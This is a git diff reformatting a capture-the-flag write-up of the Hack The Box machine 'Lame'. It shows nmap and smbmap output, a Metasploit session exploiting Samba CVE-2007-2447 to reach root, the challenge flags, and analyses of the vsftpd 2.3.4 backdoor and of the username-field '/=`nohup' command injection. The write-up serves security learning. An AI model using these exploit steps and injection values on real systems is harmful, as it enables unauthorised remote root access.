@@ -1,17 +1,26 @@
-## Information
+---
+cover: ../.gitbook/assets/bg (1).png
+coverY: -47.96423248882266
+---
+
+# Lame Writeup
+
+### Information
 
 | Property       | Value      |
 | -------------- | ---------- |
 | **Name**       | Lame       |
 | **IP Address** | 10.10.10.3 |
-| **OS**         | Lame       | 
-| **Difficulty** |  Easy          |
+| **OS**         | Lame       |
+| **Difficulty** | Easy       |
 
-## Enumeration
-### Nmap Scan
+### Enumeration
+
+#### Nmap Scan
+
 ```bash
 nmap -sC -sV -oN nmap_scan.txt -Pn 
-``` 
+```
 
 ```
 PORT    STATE SERVICE     REASON  VERSION
@@ -41,13 +50,14 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-## Initial Access
-### Port [21] - [vsFTPd 2.3.4] (False Positive)
+### Initial Access
+
+#### Port \[21] - \[vsFTPd 2.3.4] (False Positive)
 
 Anonymous login enabled, and version affected by a backdoor installed in its core, according to [Vigilance.fr](https://vigilance.fr/vulnerability/vsftpd-backdoor-in-version-2-3-4-10805), between the 30th of June 2011 and the 3rd of July 2011, a backdoor was added in the source code. This backdoor detects if the login starts by ":)", and then opens a shell on the port 6200/tcp.
 
-### Port [139] - [Samba]
- 
+#### Port \[139] - \[Samba]
+
 ```
 seifallah@seifallah-pwnbox:~/Documents/htb/lame$ smbmap -H 10.10.10.3 
 [+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
@@ -62,15 +72,11 @@ seifallah@seifallah-pwnbox:~/Documents/htb/lame$
 
 ```
 
-#### Vulnerability Exploited
+**Vulnerability Exploited**
 
-Samba 3.0.20 affected by [CVE-2007-2447](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/), by specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
+Samba 3.0.20 affected by [CVE-2007-2447](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap\_script/), by specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!
 
-
-
-
-
-#### Exploitation Steps
+**Exploitation Steps**
 
 ```bash
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search usermap_script 
@@ -96,37 +102,40 @@ uid=0(root) gid=0(root)
 
 ```
 
-### User Access
+#### User Access
 
 The exploit led to root privileges.
 
-#### User Flag
+**User Flag**
 
-``db8451e9e86a5854d3bb8e71598a30b4``
-## Privilege Escalation
+`db8451e9e86a5854d3bb8e71598a30b4`
 
--
-#### Root Flag
+### Privilege Escalation
 
-``f7364bd52d75cae5d3ad5d1e43d3fdbc``
-## Conclusion
+*
 
+**Root Flag**
 
-## Additional Notes
+`f7364bd52d75cae5d3ad5d1e43d3fdbc`
 
-###  vsftpd Backdoor Analysis
+### Conclusion
 
-This CVE is a backdoor in the **vsftpd** FTP server version **2.3.4**. The master site hosting the downloadable client had a backdoored version uploaded. The backdoor works by checking if the username string ends with a smiley face “:)”; after which it calls `vsf_sysutil_extra()`. The called function then binds to port 6200 and awaits a connection. Any command then issued to that port gets executed via `execl`.
+### Additional Notes
 
-![](Lame%20Writeup%20-%20Backdoor%20Trigger.png)
+#### vsftpd Backdoor Analysis
 
-Using ``netstat -tnlp``, backdoor launch confirmed: 
+This CVE is a backdoor in the **vsftpd** FTP server version **2.3.4**. The master site hosting the downloadable client had a backdoored version uploaded. The backdoor works by checking if the username string ends with a smiley face “:)”; after which it calls `vsf_sysutil_extra()`. The called function then binds to port 6200 and awaits a connection. Any command then issued to that port gets executed via `execl`.
+
+![](<Lame Writeup - Backdoor Trigger.png>)
+
+Using `netstat -tnlp`, backdoor launch confirmed:
 
 ```bash
 tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5645/Xtightvnc
 ```
 
-#### Backdoor Code Snippet 
+**Backdoor Code Snippet**
+
 https://pastebin.com/AetT9sS5
 
 ```c
@@ -155,9 +164,9 @@ vsf_sysutil_extra(void)
 
 ```
 
-### CVE-2007-2447 (SMB) Analysis
+#### CVE-2007-2447 (SMB) Analysis
 
-#### Vulnerable Code Snippet
+**Vulnerable Code Snippet**
 
 ```c
 /* first try the username map script */
@@ -180,11 +189,11 @@ if ( *cmd ) {
         }
 ```
 
-The _**smbrun()**_ function is responsible for executing system commands, using backticks \`\` or $() makes command execution possible 
+The _**smbrun()**_ function is responsible for executing system commands, using backticks \`\` or $() makes command execution possible
 
-![](Lame%20Writeup%20-%20SMB%20Clean%20Paload.png)
+![](<Lame Writeup - SMB Clean Paload.png>)
 
-Multiple available exploits including the metasploit module requires inserting the ``/=`nohup`` before the malicious payload, the equal sign is not required and the nohup command keep processes running even after exiting the shell or terminal.
+Multiple available exploits including the metasploit module requires inserting the ``/=`nohup`` before the malicious payload, the equal sign is not required and the nohup command keep processes running even after exiting the shell or terminal.
 
 ```ruby
  def exploit
@@ -203,12 +212,10 @@ Multiple available exploits including the metasploit module requires inserting t
 end
 ```
 
-The slash / is ued for seperating the username and the Domain as shown below. 
+The slash / is ued for seperating the username and the Domain as shown below.
 
-![](Lame%20Writeup%20-%20SMB%20Malicious%20Request.png)
+![](<Lame Writeup - SMB Malicious Request.png>)
 
+### Resources
 
-## Resources
-
-https://vigilance.fr/vulnerability/vsftpd-backdoor-in-version-2-3-4-10805
-https://systemweakness.com/a-look-at-cve-2011-2523-and-cve-2007-2447-493c1027965d
+https://vigilance.fr/vulnerability/vsftpd-backdoor-in-version-2-3-4-10805 https://systemweakness.com/a-look-at-cve-2011-2523-and-cve-2007-2447-493c1027965d
